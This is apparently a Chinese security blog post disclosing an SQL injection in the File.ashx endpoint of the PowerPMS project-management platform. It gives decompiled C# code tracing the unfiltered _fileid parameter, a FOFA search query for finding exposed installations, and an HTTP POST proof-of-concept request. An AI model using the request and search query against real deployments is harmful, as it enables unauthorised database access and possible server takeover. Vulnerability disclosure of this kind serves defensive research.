---
title: "普华Powerpms File.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/powerpms-File-sqli.html
asset_dir: assets/普华powerpms-file.ashx-sql注入漏洞
---

# 普华Powerpms File.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/12 09:10
* 897浏览
* [0评论](#comment)
* 50分钟阅读

深入探索

软件

数据库

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统`File.ashx`接口存在SQL注入漏洞，攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power\_login\_btn"

# 漏洞分析

根据`File.ashx`的代码引用找到`Power.PMS.dll`里面的`PowerPlat.Control.File`实现

```
public IAsyncResult BeginProcessRequest(HttpContext context, AsyncCallback cb, object extraData)
{
  if (string.op_Inequality(ConfigurationManager.AppSettings["Power.CloseThreedUnique"], "true"))
    Helper.SetThreedUnique();
  return (IAsyncResult) BeginProcess.BeginProcessRequest(context, cb, extraData, File.MaxUploadBigFileNum, File.FileList);
}
```

跟进 `BeginProcess.BeginProcessRequest`

```
public static AsyncFileResult BeginProcessRequest(
  HttpContext context,
  AsyncCallback cb,
  object extraData,
  long MaxUploadBigFileNum,
  Hashtable FileList)
{
  Helper.SetThreedUnique();
  try
  {
    AsyncUploadFile auf = new AsyncUploadFile();
    string str1 = RequestHelper.GetString("action");
    auf.context = context;
    auf.FileId = RequestHelper.GetString("_fileid");
    auf.Start = RequestHelper.GetLong("_start", 0L);
    auf.End = RequestHelper.GetLong("_end", 0L);
    auf.Total = RequestHelper.GetLong("_total", 0L);
    auf.FileCode = RequestHelper.GetString("FileCode");
    auf.FileName = RequestHelper.GetString("_filename");
    auf.uploadType = FileHelper.GetUploadType(context);
    auf.KeyValue = RequestHelper.GetString("KeyValue");
    auf.TemplateId = RequestHelper.GetString("TemplateId");
    auf.KeyWord = RequestHelper.GetString("KeyWord");
    auf.FilesHash = RequestHelper.GetString("_FilesHash");
    auf.EntityFilesid = RequestHelper.GetString("_EntityFilesid");
    auf.serverPath = RequestHelper.GetString("serverPath");
    auf.SmFileStatus = RequestHelper.GetString("SmFileStatus");
    auf.uploadExtAction = RequestHelper.GetString("uploadExtAction");
    UploadAction uploadAction = UploadAction.Normal;
    Enum.TryParse<UploadAction>(RequestHelper.GetString("uploadActionWhenExists"), ref uploadAction);
    auf.uploadActionWhenExists = uploadAction;
    string str2 = Guid.NewGuid().ToString();
    context.Session.Add("traceid", (object) str2);
    auf.LibCode = RequestHelper.GetString("libid");
    FtpHelper.WriteFileLog($"traceid:{str2}_开始_{str1}_{auf.FileId}");
    if (auf.LibCode == null || string.IsNullOrEmpty(auf.LibCode))
      auf.LibCode = FileHelper.GetLibId(context);
    IUpLoadFile postedFile = FileHelper.GetPostedFile(context, auf.LibCode);
    AsyncFileResult result = new AsyncFileResult();
    if (auf.uploadType != UploadType.Other && auf.LibCode.Length == 36 && !EntityFilesLibHelper.GetExist(auf.LibCode))
    {
      result.Message = "文件库无效或未启用";
      Power.Global.ViewResultModel viewResultModel = Power.Global.ViewResultModel.Create(false, "文件库无效或未启用");
      viewResultModel.data = new Hashtable();
      viewResultModel.data[(object) "CheckUploadFail"] = (object) true;
      context.Response.Write(viewResultModel.ToJson());
      return result;
    }
    if (string.op_Equality(str1, "upload"))
      result = Upload.UploadFiles(context, cb, auf, result, MaxUploadBigFileNum, FileList, postedFile);
    else if (string.op_Equality(str1, "download"))
      result = Download.DownloadFiles(context, cb, auf, result, postedFile);
    else if (string.op_Equality(str1, "topdf"))
      result = Topdf.TopdfFiles(context, cb, auf, result, postedFile);
    else if (string.op_Equality(str1, "browser"))
      result = Browser.BrowserFiles(context, cb, auf, result, postedFile);
    else if (string.op_Equality(str1, "delete"))
      result = Delete.DeleteFiles(context, auf, result, postedFile);
    else if (string.op_Equality(str1, "zip"))
      Zipfile.ZipfileFiles(context);
    else if (string.op_Equality(str1, "copyfile"))
    {
      result = Copyfile.CopyfileFiles(context, auf, result, postedFile);
    }
    else
    {
      Power.Global.Files.ViewResultModel viewResultModel = Power.Global.Files.ViewResultModel.Create(false, "数据包异常");
      context.Response.Write(viewResultModel.ToJson());
      return result;
    }
    return result;
  }
  catch (Exception ex)
  {
    throw ex;
  }
}
```

根据 `action` 执行具体操作，当`action=download、browser、topdf、delete`等时，

以`DownloadFiles`为例

```
public static AsyncFileResult DownloadFiles(
  HttpContext context,
  AsyncCallback cb,
  AsyncUploadFile auf,
  AsyncFileResult result,
  IUpLoadFile httpUploadFile)
{
  try
  {
    auf.Action = FileAction.Download;
    IBaseBusiness byKey = BusinessFactory.CreateBusinessOperate("DocFile").FindByKey((object) auf.FileId, SearchFlag.IgnoreRight);
    if (byKey != null)
```

`_fileid`参数(`auf`)使用`FindByKey`查找，无过滤或校验，因此造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，就是朴实无华。

代码安全审计

# 漏洞复现

```
POST /PowerPlat/Control/File.ashx HTTP/1.1
Host: powerpms.mrxn.net
Content-Type: application/x-www-form-urlencoded

NoCheckSession=true&ServerOperatorType=OpenRecord&_fileid=SQLI_POC&_type=ftp&action=topdf&sessionid=1
```

[![普华Powerpms File.ashx SQL注入漏洞](images/img-001-95f57308136f.webp)](https://image.mrxn.net/26da1db5dc3a40008274d7822f858284.webp)

通过报错注入成功在响应回显数据库版本信息

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[普华Powerpms File.ashx SQL注入漏洞](https://mrxn.net/jswz/powerpms-File-sqli.html)  
文章链接：<https://mrxn.net/jswz/powerpms-File-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/powerpms-File-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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